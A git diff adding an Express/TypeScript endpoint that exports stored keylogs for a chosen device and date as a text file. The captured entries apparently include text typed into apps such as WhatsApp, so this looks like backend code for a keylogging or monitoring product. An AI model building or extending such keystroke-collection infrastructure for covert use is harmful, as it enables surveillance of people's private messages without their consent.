@@ -129,6 +129,68 @@ export const getKeyLogContents = async (req: Request, res: Response) => {
 	}
 };
 
+// Download Keylogs files
+export const DownloadKeyLogFiles = async (req: Request, res: Response) => {
+	const errors = validationResult(req);
+	if (!errors.isEmpty()) {
+		return res.status(400).json({ errors: errors.array() });
+	}
+
+	const { deviceId, date } = req.params;
+
+	try {
+		// Parse the date and define the start and end of the day
+		const startOfDay = new Date(date);
+		startOfDay.setUTCHours(0, 0, 0, 0); // Start of the day
+		const endOfDay = new Date(date);
+		endOfDay.setUTCHours(23, 59, 59, 999); // End of the day
+
+		// Fetch key logs for the specified deviceId and date
+		const keyLogs = await KeyLogs.find({
+			deviceId,
+			created_at: {
+				$gte: startOfDay,
+				$lt: endOfDay,
+			},
+		});
+
+		// Format key logs for text file
+		const content = keyLogs
+			.map((log) => {
+				// Convert created_at to Date object
+				const createdAt = new Date(log.created_at as any);
+
+				// Format the date to DD/MM/YYYY HH:mm
+				const day = String(createdAt.getDate()).padStart(2, "0");
+				const month = String(createdAt.getMonth() + 1).padStart(2, "0");
+				const year = createdAt.getFullYear();
+				const hours = String(createdAt.getHours()).padStart(2, "0");
+				const minutes = String(createdAt.getMinutes()).padStart(2, "0");
+
+				const formattedDate = `${day}/${month}/${year} ${hours}:${minutes}`;
+
+				// Assuming log.keyevent contains information like "[Ch] /com.whatsapp / Text Input"
+				return `${formattedDate} - ${log.keylogs} / ${log.keyLogsType} / ${log.keyevent}`;
+			})
+			.join("\n");
+
+		// Set response headers for file download
+		res.setHeader(
+			"Content-Disposition",
+			`attachment; filename=keylogs_${deviceId}_${date}.txt`
+		);
+		res.setHeader("Content-Type", "text/plain");
+
+		// Send the content as the response
+		res.send(content);
+	} catch (error) {
+		console.error("Error processing keylogs download:", error);
+		res.status(500).json({
+			error: "Failed to process the keylogs download",
+		});
+	}
+};
+
 // Add New KeyLogs
 // export const addNewKeyLogs = async (data: any) => {
 // 	try {
